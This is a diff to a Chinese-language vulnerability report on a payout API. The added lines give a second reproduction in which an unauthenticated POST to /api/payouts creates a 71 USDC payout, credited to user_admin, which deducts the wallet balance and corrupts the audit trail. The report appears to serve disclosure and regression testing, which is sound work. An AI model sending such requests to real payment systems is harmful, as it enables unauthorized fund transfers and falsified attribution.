@@ -314,6 +314,40 @@ Content-Type: application/json
 實際扣減：1.000 USDC（出款成功執行）
 ```
 
+**第二次重現（71 USDC）：**
+```http
+POST /api/payouts
+（無任何 header）
+
+{
+  "walletId": "wallet_main",
+  "recipientAddress": "0xaaaa...aaaa",
+  "amount": 71,
+  "idempotencyKey": "anon-repro-002"
+}
+```
+
+**Response：**
+```json
+{
+  "payout": {
+    "id": "payout_5053a09c",
+    "amount": 71,
+    "status": "processing",
+    "createdByUserId": "user_admin"
+  },
+  "wallet": {
+    "availableBalance": 11344.38,
+    "pendingBalance": 81
+  }
+}
+```
+
+兩次重現結果一致：
+- 無需任何身份驗證，HTTP 200 成功建立出款
+- 系統將操作歸屬於 user_admin，稽核紀錄遭汙染
+- 錢包餘額立即扣減（第一次 -1 USDC，第二次 -71 USDC）
+
 **初始測試程式碼（仍有效）：**
 ```python
 def test_no_user_id_header_rejected(self):
